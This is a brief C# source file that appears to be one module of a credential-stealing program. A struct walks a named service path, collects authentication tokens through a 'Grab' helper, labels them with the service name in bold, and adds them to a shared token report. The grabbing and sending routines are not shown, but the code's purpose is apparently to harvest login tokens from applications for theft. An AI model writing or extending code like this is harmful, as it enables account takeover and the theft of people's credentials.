public struct ITKLog_Service
{
    private readonly string _serviceName;
    private readonly string _servicePath;

    public ITKLog_Service(string name, string path)
    {
        _serviceName = name;
        _servicePath = path;
    }

    public void GetTokens()
    {
        var tokens = ITKLog_Grab.GetTokens(_servicePath);
        if (tokens.Count <= 0) return;
        tokens.Insert(0, $"\n**{_serviceName}**");
        ITKLog.TokenReport.AddRange(tokens);
    }
}